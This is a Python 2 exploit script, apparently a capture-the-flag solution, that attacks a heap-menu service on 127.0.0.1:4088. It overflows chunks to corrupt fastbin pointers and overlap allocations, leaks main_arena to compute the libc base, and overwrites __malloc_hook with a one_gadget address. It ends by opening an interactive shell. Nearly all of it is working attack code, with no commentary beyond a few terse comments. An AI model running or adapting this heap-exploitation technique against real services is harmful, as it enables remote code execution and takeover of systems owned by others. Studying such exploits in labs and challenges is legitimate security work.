import socket, struct, telnetlib
import sys
import time


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


def alloc(size):
    print 'Alloc'
    read_until(f, 'Command: ')
    f.write('1\n')
    read_until(f, 'Size: ')
    f.write(str(size) + '\n')


def fill(index, content):
    print 'Fill {}'.format(index)
    read_until(f, 'Command: ')
    f.write('2\n')
    read_until(f, 'Index: ')
    f.write(str(index) + '\n')
    read_until(f, 'Size: ')
    f.write(str(len(content)) + '\n')
    read_until(f, 'Content: ')
    f.write(content)


def free(index):
    print 'Free {}'.format(index)
    read_until(f, 'Command: ')
    f.write('3\n')
    read_until(f, 'Index: ')
    f.write(str(index) + '\n')


def dump(index):
    read_until(f, 'Command: ')
    f.write('4\n')
    read_until(f, 'Index: ')
    f.write(str(index) + '\n')
    read_until(f, 'Content: \n')
    content = read_until(f)
    return content


s, f = sock("127.0.0.1", 4088)


for _ in xrange(4):
    alloc(0x20) # fastbin
alloc(0x80) # smallbin


free(1)
free(2)


payload = ''
payload += p64(0x00) * 5
payload += p64(0x31)
payload += p64(0x00) * 5
payload += p64(0x31)
payload += struct.pack('B', 0xc0) # Change fd so it will point to smallbin
fill(0, payload)

payload = ''
payload += p64(0x00) * 5
payload += p64(0x31)
fill(3, payload) # Change smallbin size to fastbin size


alloc(0x20)
alloc(0x20) # Another overlapping pointer to smallbin

payload = ''
payload += p64(0x00) * 5
payload += p64(0x91)
fill(3, payload)
alloc(0x80) # So that free(4) will not be merged with top
free(4)

content = dump(2)
addr_main_arena = u64(content[:8])
print '[+] addr_main_arena = {}'.format(hex(addr_main_arena))

offset_main_arena = 0x3c4b78
addr_libc_base = addr_main_arena - offset_main_arena
print '[+] addr_libc_base = {}'.format(hex(addr_libc_base))

offset_malloc_hook = 0x00000000003c4b10

alloc(0x60) #4
free(4)

print '[+] Fill malloc_hook {}'.format(hex(addr_libc_base + offset_malloc_hook - 0x23))

fill(2, p64(addr_libc_base + offset_malloc_hook - 0x23))
alloc(0x60)
alloc(0x60) # 6 pointing to malloc hook.


gadgets = [0x4526a, 0xf02a4, 0xf1147]

payload = ''
payload += 'AAA'
payload += 'B' * 16
payload += p64(addr_libc_base + gadgets[0])

fill(6, payload)

alloc(255)

shell(s)


# 0x555555757000
# 0xb7f0c6bf9c0
